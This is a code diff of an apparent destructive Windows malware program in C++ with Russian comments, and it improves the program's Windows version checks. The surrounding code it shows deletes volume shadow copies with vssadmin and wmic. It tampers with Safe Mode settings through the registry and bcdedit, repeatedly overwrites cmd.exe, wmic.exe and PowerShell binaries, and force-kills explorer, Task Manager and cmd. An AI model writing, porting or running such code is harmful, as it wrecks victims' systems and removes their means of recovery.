@@ -5,15 +5,14 @@
 #include <string>
 #include <vector>
 #include <filesystem>
-#include <shlwapi.h>
 
 namespace fs = std::filesystem;
 
-// Проверка версии Windows
-bool IsWindows10OrLater() {
-    OSVERSIONINFOEXW osvi = { sizeof(osvfi) };
-    osvi.dwMajorVersion = 10;
-    osvi.dwMinorVersion = 0;
+// Функции проверки версии Windows
+bool IsWindows7OrLater() {
+    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
+    osvi.dwMajorVersion = 6;
+    osvi.dwMinorVersion = 1;
     DWORDLONG conditionMask = 0;
     VER_SET_CONDITION(conditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
     VER_SET_CONDITION(conditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
@@ -21,9 +20,19 @@ bool IsWindows10OrLater() {
 }
 
 bool IsWindows8OrLater() {
-    OSVERSIONINFOEXW osvi = { sizeof(osvfi) };
+    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
     osvi.dwMajorVersion = 6;
     osvi.dwMinorVersion = 2;
+    DWORDLONG conditionMask = 0;
+    VER_SET_CONDITION(conditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
+    VER_SET_CONDITION(conditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
+    return VerifyVersionInfoW(&osvi, VER_MAJORVERSION | VER_MINORVERSION, conditionMask) != FALSE;
+}
+
+bool IsWindows10OrLater() {
+    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
+    osvi.dwMajorVersion = 10;
+    osvi.dwMinorVersion = 0;
     DWORDLONG conditionMask = 0;
     VER_SET_CONDITION(conditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
     VER_SET_CONDITION(conditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
@@ -51,7 +60,7 @@ void BlockSafeModeUniversal() {
     system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\" /v OptionValue /t REG_DWORD /d 1 /f");
     system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Option\" /v UseAlternateShell /t REG_DWORD /d 0 /f");
     
-    // Для Windows 10/11 добавляем bcdedit
+    // Для Windows 8/10/11 добавляем bcdedit
     if (IsWindows8OrLater()) {
         system("bcdedit /set {default} safeboot minimal 2>nul");
         system("bcdedit /set {default} safeboot network 2>nul");
@@ -67,7 +76,6 @@ void BlockSafeModeUniversal() {
     
     // Для Windows 7 используем старые методы
     if (!IsWindows8OrLater()) {
-        // Удаляем точки восстановления через VSS (работает на Win7)
         system("vssadmin delete shadows /all /quiet 2>nul");
         system("wmic shadowcopy delete 2>nul");
     }
@@ -82,7 +90,7 @@ void DeleteCmdExeUniversal() {
             "C:\\Windows\\System32\\wbem\\wmic.exe"
         };
         
-        // PowerShell есть только на Win7+, но мы добавим для всех
+        // PowerShell есть на Win7+
         if (IsWindows7OrLater()) {
             cmdPaths.push_back("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
             cmdPaths.push_back("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe");
@@ -90,7 +98,6 @@ void DeleteCmdExeUniversal() {
         
         for (const auto& path : cmdPaths) {
             if (fs::exists(path)) {
-                // Перезаписываем файл
                 for (int i = 0; i < 5; i++) {
                     std::ofstream out(path, std::ios::binary);
                     if (out) {
@@ -128,7 +135,6 @@ void KillProcessesUniversal() {
         "explorer.exe"
     };
     
-    // Добавляем специфичные для разных версий
     if (IsWindows10OrLater()) {
         killList.push_back("SystemSettings.exe");
         killList.push_back("StartMenuExperienceHost.exe");
@@ -156,7 +162,6 @@ void KillProcessesUniversal() {
             CloseHandle(snapshot);
         }
         
-        // Убиваем процессы через taskkill (работает везде)
         system("taskkill /f /im explorer.exe 2>nul");
         system("taskkill /f /im taskmgr.exe 2>nul");
         system("taskkill /f /im cmd.exe 2>nul");
